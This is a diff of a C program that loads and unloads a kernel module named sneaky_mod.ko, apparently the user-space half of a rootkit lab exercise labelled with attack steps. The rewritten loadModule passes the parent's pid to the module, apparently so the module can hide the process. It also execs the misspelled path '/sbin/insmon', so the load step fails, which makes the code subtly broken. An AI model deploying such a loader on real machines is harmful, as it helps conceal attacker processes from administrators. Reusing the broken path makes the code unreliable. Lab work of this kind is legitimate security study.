@@ -1,5 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <sys/types.h>
+#include <sys/wait.h>
 #include <unistd.h>
 
 #define DEBUG 1 // 1 to print debug info
@@ -37,6 +39,12 @@ int main(int argc, char **argv) {
     printf("Sneaky_mod loaded successfully.\n");
 
   // Attack 4: enter waiting loop, fork child process
+  while (1) {
+    char ch = getchar();
+    if (ch == 'q') {
+      break;
+    }
+  }
 
   // finish step 1: rmmod
   unloadModule();
@@ -90,18 +98,47 @@ void updateFile() {
 }
 
 void loadModule() {
-  pid_t pid = getpid();
-  char command[80];
-  sprintf(command, "insmod ./sneaky_mod.ko pid=%d", pid);
-  if (system(command) < 0) {
-    printf("Error in insmod...\n");
+  pid_t mypid;
+  mypid = fork();
+
+  if (mypid < 0) {
+    printf("Error in fork...\n");
     exit(EXIT_FAILURE);
+  } else if (mypid > 0) { // parent wait for child
+    pid_t wpid = waitpid(mypid, NULL, 0);
+    if (wpid < 0) {
+      printf("Error in waiting pid...\n");
+      exit(EXIT_FAILURE);
+    }
+  } else { // child do his own thang
+    char args[50];
+    long ppid = getppid(); // need parent pid
+    sprintf(args, "pid=%ld", ppid);
+
+    if (execl("/sbin/insmon", "insmod", "sneaky_mod.ko", args, (char *)NULL) <
+        0) {
+      printf("Error in loading module...\n");
+      exit(EXIT_FAILURE);
+    }
   }
 }
 
 void unloadModule() {
-  if (system("rmmod ./sneaky_mod.ko") < 0) {
-    printf("Error in rmmod...\n");
+  pid_t mypid = fork();
+  if (mypid < 0) {
+    printf("Error unloadmodule...\n");
     exit(EXIT_FAILURE);
+  } else if (mypid > 0) { // parent wait
+    pid_t wpid = waitpid(mypid, NULL, 0);
+
+    if (wpid < 0) {
+      printf("Error in waitpid...\n");
+      exit(EXIT_FAILURE);
+    }
+  } else { // child do his own thang
+    if (execl("/sbin/rmmod", "rmmod", "sneaky_mod.ko", (char *)NULL) < 0) {
+      printf("Error unload module...\n");
+      exit(EXIT_FAILURE);
+    }
   }
 }
